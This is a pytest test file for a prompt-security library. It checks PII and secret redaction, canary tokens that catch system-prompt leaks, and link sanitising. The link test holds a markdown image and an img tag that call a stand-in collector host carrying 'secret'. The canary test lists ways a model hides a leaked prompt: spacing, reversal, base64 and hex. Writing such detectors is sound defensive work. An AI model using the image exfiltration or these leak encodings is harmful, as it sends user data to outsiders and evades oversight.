from __future__ import annotations

import base64

import pytest

from promptwall.scanners import canary, links, pii, pii_benchmark, secrets


@pytest.mark.parametrize(
    ("text", "kind", "value"),
    [
        (
            "mail me at jane.doe+billing@example.co.uk please",
            pii.EMAIL,
            "jane.doe+billing@example.co.uk",
        ),
        ("call 06 12 34 56 78 tonight", pii.PHONE, "06 12 34 56 78"),
        ("or +33 6 12 34 56 78", pii.PHONE, "+33 6 12 34 56 78"),
        ("US office: (415) 555-0132", pii.PHONE, "(415) 555-0132"),
        ("card 4111 1111 1111 1111 expired", pii.CREDIT_CARD, "4111 1111 1111 1111"),
        (
            "IBAN FR76 3000 6000 0112 3456 7890 189 ok",
            pii.IBAN,
            "FR76 3000 6000 0112 3456 7890 189",
        ),
        ("server 192.168.1.20 down", pii.IP_ADDRESS, "192.168.1.20"),
    ],
)
def test_pii_positive(text, kind, value):
    found = pii.detect(text)
    assert [(e.kind, e.value) for e in found] == [(kind, value)]


@pytest.mark.parametrize(
    "text",
    [
        "Order 1234567812345678 shipped",  # 16 digits, fails Luhn
        "Invoice INV-2024-55123 attached",
        "Version 2.14.0 released on 03/04/2025",
        "Total 129.99 EUR, ref 884213",
        "loopback 127.0.0.1 is fine",
    ],
)
def test_pii_negative(text):
    assert pii.detect(text) == []


def test_checksums():
    assert pii.luhn_ok("4111111111111111") and not pii.luhn_ok("4111111111111112")
    assert pii.iban_ok("FR7630006000011234567890189") and not pii.iban_ok(
        "FR7630006000011234567890180"
    )
    assert pii.nir_ok(pii_benchmark.nir(__import__("random").Random(1)))


def test_pseudonymise_round_trip_and_stable_placeholders():
    vault = pii.Vault()
    text = "Write to bob@example.com, cc bob@example.com and alice@example.org"
    masked, found = pii.pseudonymise(text, vault)
    assert masked == "Write to [EMAIL_1], cc [EMAIL_1] and [EMAIL_2]"
    assert len(found) == 3
    assert (
        vault.restore("Sent to [EMAIL_2] and [EMAIL_1].")
        == "Sent to alice@example.org and bob@example.com."
    )
    assert vault.restore("[EMAIL_9] is unknown") == "[EMAIL_9] is unknown"


def test_output_redaction_is_irreversible():
    text, found = pii.redact("leaked: carol@example.net")
    assert text == "leaked: [REDACTED_EMAIL]" and found[0].kind == pii.EMAIL


def test_pii_benchmark_runs():
    r = pii_benchmark.run(n=300, seed=3)
    assert r["recall"] > 0.99 and r["precision"] > 0.97


@pytest.mark.parametrize(
    ("text", "kind"),
    [
        ("key AKIAABCDEFGHIJKLMNOP here", "AWS_ACCESS_KEY_ID"),
        ("token ghp_" + "a" * 36, "GITHUB_TOKEN"),
        ("password = hunter2hunter2", "PASSWORD_ASSIGNMENT"),
        ("-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----", "PRIVATE_KEY"),
    ],
)
def test_secrets(text, kind):
    found = secrets.detect(text)
    assert [s.kind for s in found] == [kind]
    redacted, _ = secrets.redact(text)
    assert f"[REDACTED_{kind}]" in redacted


def test_password_assignment_keeps_the_key_name():
    redacted, _ = secrets.redact("db password: s3cretValue!")
    assert redacted == "db password: [REDACTED_PASSWORD_ASSIGNMENT]"


def test_canary_detects_plain_and_obfuscated_leaks():
    token = canary.new_canary()
    assert canary.plant("Be nice.", token).startswith(f"<!-- {token} -->")
    assert canary.leaked(f"my instructions start with {token}", token) == "plain"
    assert canary.leaked(" ".join(token.upper()), token) == "obfuscated"
    assert canary.leaked(f"reversed: {token[::-1]}", token) == "reversed"
    encoded = base64.b64encode(f"marker {token} end".encode()).decode()
    assert canary.leaked(f"here you go: {encoded}", token) == "encoded"
    assert canary.leaked(f"hex: {f'x {token} y'.encode().hex()}", token) == "encoded"
    assert canary.leaked("a perfectly normal answer about routers", token) is None


def test_links_sanitise_remote_images_but_keep_allowlisted_ones():
    text = (
        "See ![chart](https://acme.example/chart.png) and "
        "![x](https://collector.invalid/p?q=secret) and [docs](https://other.invalid/page) "
        'and <img src="https://collector.invalid/t.gif">'
    )
    out, found = links.sanitise(text, allowed_domains=["acme.example"])
    assert "acme.example/chart.png" in out
    assert "collector.invalid" not in out and "other.invalid" not in out
    assert "docs (link removed)" in out
    assert sorted(f.kind for f in found) == ["image", "image", "link"]
